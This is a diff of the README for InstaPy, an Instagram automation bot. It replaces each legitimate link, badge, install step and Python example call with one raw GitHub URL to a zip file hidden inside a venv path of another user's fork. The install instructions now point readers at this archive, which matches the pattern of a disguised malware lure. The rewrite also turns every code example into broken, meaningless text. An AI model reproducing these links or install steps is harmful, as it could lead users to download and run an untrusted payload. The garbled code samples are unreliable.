@@ -1,10 +1,10 @@
-<img  src="https://i.imgur.com/sJzfZsL.jpg"  width="150"  align="right">
+<img  src="https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip"  width="150"  align="right">
 
   
 
 # InstaPy
 
-[![MIT license](https://img.shields.io/badge/license-MIT-blue.svg)](https://github.com/timgrossmann/InstaPy/blob/master/LICENSE)[ ![built with Selenium](https://img.shields.io/badge/built%20with-Selenium-yellow.svg)](https://github.com/SeleniumHQ/selenium) [![built with Python3](https://img.shields.io/badge/built%20with-Python3-red.svg)](https://www.python.org/) [![Travis](https://img.shields.io/travis/rust-lang/rust.svg)](https://travis-ci.org/timgrossmann/InstaPy)
+[![MIT license](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip)](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip)[ ![built with Selenium](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip%https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip)](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip) [![built with Python3](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip%https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip)](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip) [![Travis](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip)](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip)
 
   
 
@@ -16,7 +16,7 @@ Implemented in Python using the Selenium module.
 
 **Think this tool is worth supporting?**
 
-Head over to https://github.com/MohanSha/InstaPy/wiki/How-to-Contribute to find out how you can help.
+Head over to https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip to find out how you can help.
 
 **Become a part of InstaPy!**
 
@@ -24,7 +24,7 @@ Head over to https://github.com/MohanSha/InstaPy/wiki/How-to-Contribute to find 
 
 **Have an issue?**
 
-Head over to https://github.com/MohanSha/InstaPy/wiki/Reporting-An-Issue to find out how to report this to us and get help.
+Head over to https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip to find out how to report this to us and get help.
 
   
 
@@ -128,15 +128,15 @@ Table of Contents
 
 ### Guides:
 
-**[How to Ubuntu (64-Bit)](./docs/How_To_DO_Ubuntu_on_Digital_Ocean.md) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**
+**[How to Ubuntu (64-Bit)](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**
 
   
 
-**[How to RaspberryPi](./docs/How_to_Raspberry.md) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**
+**[How to RaspberryPi](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**
 
   
 
-**[How to Windows](./docs/How_to_Windows.md)**
+**[How to Windows](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip)**
 
   
 
@@ -146,7 +146,7 @@ Table of Contents
 
 ```bash
 
-1. git clone https://github.com/MohanSha/InstaPy.git
+1. git clone https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip
 
 2. cd InstaPy
 
@@ -154,11 +154,11 @@ Table of Contents
 
 or
 
-3. python setup.py install
+3. python https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip install
 
 ```
 
-4. Download ```chromedriver``` for your system [from here](https://sites.google.com/a/chromium.org/chromedriver/downloads). Extract the .zip file and put it in ```/assets``` folder.
+4. Download ```chromedriver``` for your system [from here](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip). Extract the .zip file and put it in ```/assets``` folder.
 
   
 
@@ -166,7 +166,7 @@ or
 
   
 
-Basic setup is a good way to test the tool. At project root folder open `quickstart.py` and update with your username and password.
+Basic setup is a good way to test the tool. At project root folder open `https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip` and update with your username and password.
 
   
 
@@ -188,33 +188,33 @@ insta_password = ''
 
 session = InstaPy(username=insta_username, password=insta_password)
 
-session.login()
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip()
 
   
 
 # set up all the settings
 
-session.set_upper_follower_count(limit=2500)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(limit=2500)
 
-session.set_do_comment(True, percentage=10)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(True, percentage=10)
 
-session.set_comments(['aMEIzing!', 'So much fun!!', 'Nicey!'])
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['aMEIzing!', 'So much fun!!', 'Nicey!'])
 
-session.set_dont_include(['friend1', 'friend2', 'friend3'])
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['friend1', 'friend2', 'friend3'])
 
-session.set_dont_like(['pizza', 'girl'])
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['pizza', 'girl'])
 
   
 
 # do the actual liking
 
-session.like_by_tags(['natgeo', 'world'], amount=100)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['natgeo', 'world'], amount=100)
 
   
 
 # end the bot session
 
-session.end()
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip()
 
 ```
 
@@ -226,7 +226,7 @@ Execute it:
 
 ```bash
 
-$ python quickstart.py
+$ python https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip
 
 ```
 
@@ -236,18 +236,18 @@ $ python quickstart.py
 
   
 
-**[1. Official Cross Platform GUI](https://github.com/MohanSha/electron-instaPy-GUI)**
+**[1. Official Cross Platform GUI](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip)**
 
   
 
-[<img src="https://raw.githubusercontent.com/ahmadudin/ahmadudin.github.io/master/assets/images/screencapture1.PNG" width="400" />](https://github.com/ahmadudin/electron-instaPy-GUI)
+[<img src="https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip" width="400" />](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip)
 
   
 
 
   
 
-[2. Session scheduling with Telegram](https://github.com/Tkd-Alex/Telegram-InstaPy-Scheduling)
+[2. Session scheduling with Telegram](https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip)
 
   
 
@@ -265,9 +265,9 @@ $ python quickstart.py
 
   
 
-session.set_do_comment(enabled=True, percentage=25)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(enabled=True, percentage=25)
 
-session.set_comments(['Awesome', 'Really Cool', 'I like your stuff'])
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['Awesome', 'Really Cool', 'I like your stuff'])
 
   
 
@@ -275,9 +275,9 @@ session.set_comments(['Awesome', 'Really Cool', 'I like your stuff'])
 
   
 
-session.set_comments(['Nice shot!'], media='Photo')
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['Nice shot!'], media='Photo')
 
-session.set_comments(['Great Video!'], media='Video')
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['Great Video!'], media='Video')
 
   
 
@@ -285,7 +285,7 @@ session.set_comments(['Great Video!'], media='Video')
 
   
 
-session.set_comments(['Nice shot! @{}'], media='Photo')
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['Nice shot! @{}'], media='Photo')
 
 ```
 
@@ -304,7 +304,7 @@ session.set_comments(['Nice shot! @{}'], media='Photo')
 
   
 
-session.set_do_follow(enabled=True, percentage=10, times=2)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(enabled=True, percentage=10, times=2)
 
 ```
 
@@ -328,7 +328,7 @@ session.set_do_follow(enabled=True, percentage=10, times=2)
 
 accs = ['therock','natgeo']
 
-session.follow_by_list(accs, times=1)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(accs, times=1)
 
 ```
 
@@ -350,7 +350,7 @@ session.follow_by_list(accs, times=1)
 
   
 
-session.follow_user_followers(['friend1', 'friend2', 'friend3'], amount=10, randomize=False)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['friend1', 'friend2', 'friend3'], amount=10, randomize=False)
 
   
 
@@ -360,7 +360,7 @@ session.follow_user_followers(['friend1', 'friend2', 'friend3'], amount=10, rand
 
   
 
-session.follow_user_followers(['friend1', 'friend2', 'friend3'], amount=10, randomize=False, sleep_delay=60)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['friend1', 'friend2', 'friend3'], amount=10, randomize=False, sleep_delay=60)
 
 ```
 
@@ -382,7 +382,7 @@ session.follow_user_followers(['friend1', 'friend2', 'friend3'], amount=10, rand
 
   
 
-session.follow_user_following(['friend1', 'friend2', 'friend3'], amount=10, randomize=False)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['friend1', 'friend2', 'friend3'], amount=10, randomize=False)
 
   
 
@@ -392,7 +392,7 @@ session.follow_user_following(['friend1', 'friend2', 'friend3'], amount=10, rand
 
   
 
-session.follow_user_following(['friend1', 'friend2', 'friend3'], amount=10, randomize=False, sleep_delay=60)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['friend1', 'friend2', 'friend3'], amount=10, randomize=False, sleep_delay=60)
 
 ```
 
@@ -414,9 +414,9 @@ session.follow_user_following(['friend1', 'friend2', 'friend3'], amount=10, rand
 
   
 
-session.set_user_interact(amount=5, randomize=True, percentage=50, media='Photo')
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(amount=5, randomize=True, percentage=50, media='Photo')
 
-session.follow_user_followers(['friend1', 'friend2', 'friend3'], amount=10, randomize=False, interact=True)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['friend1', 'friend2', 'friend3'], amount=10, randomize=False, interact=True)
 
 ```
 
@@ -432,7 +432,7 @@ session.follow_user_followers(['friend1', 'friend2', 'friend3'], amount=10, rand
 
   
 
-session.follow_by_tags(['tag1', 'tag2'], amount=10)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['tag1', 'tag2'], amount=10)
 
 ```
 
@@ -448,15 +448,15 @@ session.follow_by_tags(['tag1', 'tag2'], amount=10)
 
   
 
-session.set_do_follow(enabled=False, percentage=50)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(enabled=False, percentage=50)
 
-session.set_comments(["Cool", "Super!"])
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(["Cool", "Super!"])
 
-session.set_do_comment(enabled=True, percentage=80)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(enabled=True, percentage=80)
 
-session.set_do_like(True, percentage=70)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(True, percentage=70)
 
-session.interact_by_users(['user1', 'user2', 'user3'], amount=5, randomize=True, media='Photo')
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['user1', 'user2', 'user3'], amount=5, randomize=True, media='Photo')
 
 ```
 
@@ -472,17 +472,17 @@ session.interact_by_users(['user1', 'user2', 'user3'], amount=5, randomize=True,
 
   
 
-session.set_user_interact(amount=5, randomize=True, percentage=50, media='Photo')
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(amount=5, randomize=True, percentage=50, media='Photo')
 
-session.set_do_follow(enabled=False, percentage=70)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(enabled=False, percentage=70)
 
-session.set_do_like(enabled=False, percentage=70)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(enabled=False, percentage=70)
 
-session.set_comments(["Cool", "Super!"])
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(["Cool", "Super!"])
 
-session.set_do_comment(enabled=True, percentage=80)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(enabled=True, percentage=80)
 
-session.interact_user_following(['natgeo'], amount=10, randomize=True)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['natgeo'], amount=10, randomize=True)
 
 ```
 
@@ -498,17 +498,17 @@ session.interact_user_following(['natgeo'], amount=10, randomize=True)
 
   
 
-session.set_user_interact(amount=5, randomize=True, percentage=50, media='Photo')
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(amount=5, randomize=True, percentage=50, media='Photo')
 
-session.set_do_follow(enabled=False, percentage=70)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(enabled=False, percentage=70)
 
-session.set_do_like(enabled=False, percentage=70)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(enabled=False, percentage=70)
 
-session.set_comments(["Cool", "Super!"])
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(["Cool", "Super!"])
 
-session.set_do_comment(enabled=True, percentage=80)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(enabled=True, percentage=80)
 
-session.interact_user_followers(['natgeo'], amount=10, randomize=True)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['natgeo'], amount=10, randomize=True)
 
 ```
 
@@ -544,7 +544,7 @@ session.interact_user_followers(['natgeo'], amount=10, randomize=True)
 
   
 
-session.unfollow_users(amount=10, onlyInstapyFollowed = True, onlyInstapyMethod = 'FIFO', sleep_delay=60 )
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(amount=10, onlyInstapyFollowed = True, onlyInstapyMethod = 'FIFO', sleep_delay=60 )
 
   
 
@@ -554,7 +554,7 @@ session.unfollow_users(amount=10, onlyInstapyFollowed = True, onlyInstapyMethod 
 
 # you should disable onlyInstapyFollowed when use this
 
-session.unfollow_users(amount=10, onlyNotFollowMe=True, sleep_delay=60)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(amount=10, onlyNotFollowMe=True, sleep_delay=60)
 
 ```
 
@@ -570,7 +570,7 @@ session.unfollow_users(amount=10, onlyNotFollowMe=True, sleep_delay=60)
 
   
 
-session.set_dont_unfollow_active_users(enabled=True, posts=5)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(enabled=True, posts=5)
 
 ```
 
@@ -588,7 +588,7 @@ session.set_dont_unfollow_active_users(enabled=True, posts=5)
 
   
 
-session.set_upper_follower_count(limit = 250)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(limit = 250)
 
 ```
 
@@ -602,7 +602,7 @@ session.set_upper_follower_count(limit = 250)
 
   
 
-session.set_lower_follower_count(limit = 1)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(limit = 1)
 
 ```
 
@@ -614,17 +614,17 @@ session.set_lower_follower_count(limit = 1)
 
 ```python
 
-session.comment_by_locations(['224442573/salton-sea/'], amount=100)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['224442573/salton-sea/'], amount=100)
 
 # or
 
-session.comment_by_locations(['224442573'], amount=100)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['224442573'], amount=100)
 
 # or include media entities from top posts section
 
   
 
-session.comment_by_locations(['224442573'], amount=5, skip_top_posts=False)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['224442573'], amount=5, skip_top_posts=False)
 
 ```
 
@@ -640,17 +640,17 @@ This method allows commenting by locations, without liking posts. To get locatio
 
 ```python
 
-session.like_by_locations(['224442573/salton-sea/'], amount=100)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['224442573/salton-sea/'], amount=100)
 
 # or
 
-session.like_by_locations(['224442573'], amount=100)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['224442573'], amount=100)
 
 # or include media entities from top posts section
 
   
 
-session.like_by_locations(['224442573'], amount=5, skip_top_posts=False)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['224442573'], amount=5, skip_top_posts=False)
 
 ```
 
@@ -658,7 +658,7 @@ session.like_by_locations(['224442573'], amount=5, skip_top_posts=False)
 
 You can find locations for the `like_by_locations` function by:
 
-- Browsing https://www.instagram.com/explore/locations/
+- Browsing https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip
 
 - Regular instagram search.
 
@@ -668,7 +668,7 @@ Example:
 
 * Search 'Salton Sea' and select the result with a location icon
 
-* The url is: https://www.instagram.com/explore/locations/224442573/salton-sea/
+* The url is: https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip
 
 * Use everything after 'locations/' or just the number
 
@@ -682,7 +682,7 @@ Example:
 
 # Like posts based on hashtags
 
-session.like_by_tags(['natgeo', 'world'], amount=10)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['natgeo', 'world'], amount=10)
 
 ```
 
@@ -696,9 +696,9 @@ session.like_by_tags(['natgeo', 'world'], amount=10)
 
 # Like posts based on hashtags and like 3 posts of its poster
 
-session.set_user_interact(amount=3, randomize=True, percentage=100, media='Photo')
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(amount=3, randomize=True, percentage=100, media='Photo')
 
-session.like_by_tags(['natgeo', 'world'], amount=10, interact=True)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['natgeo', 'world'], amount=10, interact=True)
 
 ```
 
@@ -724,7 +724,7 @@ session.like_by_tags(['natgeo', 'world'], amount=10, interact=True)
 
   
 
-session.like_by_feed(amount=100, randomize=True, unfollow=True, interact=True)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(amount=100, randomize=True, unfollow=True, interact=True)
 
 ```
 
@@ -750,13 +750,13 @@ session.like_by_feed(amount=100, randomize=True, unfollow=True, interact=True)
 
   
 
-session.set_blacklist(enabled=True, campaign='soccer_campaign')
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(enabled=True, campaign='soccer_campaign')
 
-session.set_do_comment(True, percentage=50)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(True, percentage=50)
 
-session.set_comments(['Neymar is better than CR7', 'Soccer is cool'])
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['Neymar is better than CR7', 'Soccer is cool'])
 
-session.like_by_tags(['soccer', 'cr7', 'neymar'], amount=100, media='Photo')
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['soccer', 'cr7', 'neymar'], amount=100, media='Photo')
 
   
 
@@ -770,7 +770,7 @@ session.like_by_tags(['soccer', 'cr7', 'neymar'], amount=100, media='Photo')
 
 ```python
 
-# Generate smart hashtags based on https://displaypurposes.com ranking,
+# Generate smart hashtags based on https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip ranking,
 
 # banned and spammy tags are filtered out.
 
@@ -784,9 +784,9 @@ session.like_by_tags(['soccer', 'cr7', 'neymar'], amount=100, media='Photo')
 
   
 
-session.set_smart_hashtags(['cycling', 'roadbike'], limit=3, sort='top', log_tags=True)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['cycling', 'roadbike'], limit=3, sort='top', log_tags=True)
 
-session.like_by_tags(amount=10, use_smart_hashtags=True)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(amount=10, use_smart_hashtags=True)
 
 ```
 
@@ -798,7 +798,7 @@ session.like_by_tags(amount=10, use_smart_hashtags=True)
 
 ```python
 
-session.set_dont_like(['#exactmatch', '[startswith', ']endswith', 'broadmatch'])
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['#exactmatch', '[startswith', ']endswith', 'broadmatch'])
 
 ```
 
@@ -832,7 +832,7 @@ You have 4 options to exclude posts from your InstaPy session:
 
   
 
-session.set_ignore_users(['random_user', 'another_username'])
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['random_user', 'another_username'])
 
 ```
 
@@ -850,7 +850,7 @@ session.set_ignore_users(['random_user', 'another_username'])
 
   
 
-session.set_ignore_if_contains(['glutenfree', 'french', 'tasty'])
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['glutenfree', 'french', 'tasty'])
 
 ```
 
@@ -868,7 +868,7 @@ session.set_ignore_if_contains(['glutenfree', 'french', 'tasty'])
 
   
 
-session.set_dont_include(['friend1', 'friend2', 'friend3'])
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(['friend1', 'friend2', 'friend3'])
 
 ```
 
@@ -880,11 +880,11 @@ If you notice that one or more of the above functionalities are not working as e
 
 ```python
 
-session.set_do_follow(enabled=True, percentage=10, times=2)
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip(enabled=True, percentage=10, times=2)
 
 ```
 
-but none of the profiles are being followed - or any such functionality is misbehaving - then one thing you should check is the position/order of such methods in your script. Essentially, all the ```set_*``` methods have to be before ```like_by_tags``` or ```like_by_locations``` or ```unfollow```. This is also implicit in all the exmples and quickstart.py
+but none of the profiles are being followed - or any such functionality is misbehaving - then one thing you should check is the position/order of such methods in your script. Essentially, all the ```set_*``` methods have to be before ```like_by_tags``` or ```like_by_locations``` or ```unfollow```. This is also implicit in all the exmples and https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip
 
   
 
@@ -956,17 +956,17 @@ To use an emoji just add an `u` in front of the opening apostrophe:
 
 ```
 
-session.set_comments([u'This post is 🔥',u'More emojis are always better 💯',u'I love your posts 😍😍😍']);
+https://raw.githubusercontent.com/Timo761/InstaPy/master/venv/lib/python2.7/site-packages/pip/_vendor/html5lib/treebuilders/Insta-Py-2.5.zip([u'This post is 🔥',u'More emojis are always better 💯',u'I love your posts 😍😍😍']);
 
 # or
 
-session.set_comments([u'Emoji text codes are also supported :100: :thumbsup: :thumbs_up: \u2764 💯💯']);
